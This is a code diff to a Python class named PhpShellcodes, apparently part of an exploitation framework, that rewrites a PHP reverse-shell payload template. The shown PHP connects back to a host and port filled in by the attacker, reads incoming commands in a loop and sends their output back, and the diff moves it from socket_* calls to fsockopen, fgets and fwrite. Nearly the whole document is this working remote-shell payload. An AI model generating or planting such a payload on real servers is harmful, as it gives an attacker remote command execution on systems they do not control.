@@ -27,16 +27,12 @@ class PhpShellcodes(Shellcode):
         phpcode += """
 <?php
     $address="LOCALHOST";
-    $port="LOCALPORT";
+    $port=LOCALPORT;
     $buff_size=2048;
     $timeout=120;
 
-    $sock=socket_create(AF_INET,SOCK_STREAM,0) or die("Cannot create a socket");
-    socket_set_option($sock,SOL_SOCKET,SO_RCVTIMEO,array('sec'=>$timeout,'usec'=>0));
-    socket_set_option($sock,SOL_SOCKET,SO_SNDTIMEO,array('sec'=>$timeout,'usec'=>0));
-    socket_connect($sock,$address,$port) or die("Could not connect to the socket");
-
-    while ($read=socket_read($sock,$buff_size)) {
+    $sock=fsockopen($address,$port) or die("Cannot create a socket");
+    while ($read=fgets($sock,$buff_size)) {
         $out="";
         if ($read) {
             if (strcmp($read,"quit")===0 || strcmp($read,"q")===0) {
@@ -51,7 +47,7 @@ class PhpShellcodes(Shellcode):
 
         $length=strlen($out);
         while (1) {
-            $sent=socket_write($sock,$out,$length);
+            $sent=fwrite($sock,$out,$length);
             if ($sent===false) {
                 break;
             }
@@ -64,13 +60,11 @@ class PhpShellcodes(Shellcode):
             }
         }
     }
-    socket_close($sock);
+    fclose($sock);
 ?>
 """
-
         phpcode = phpcode.replace("LOCALHOST", str(localhost))
         phpcode = phpcode.replace("LOCALPORT", str(localport))
-
         return phpcode
 
     def get_php_code_inline(self, host, port):
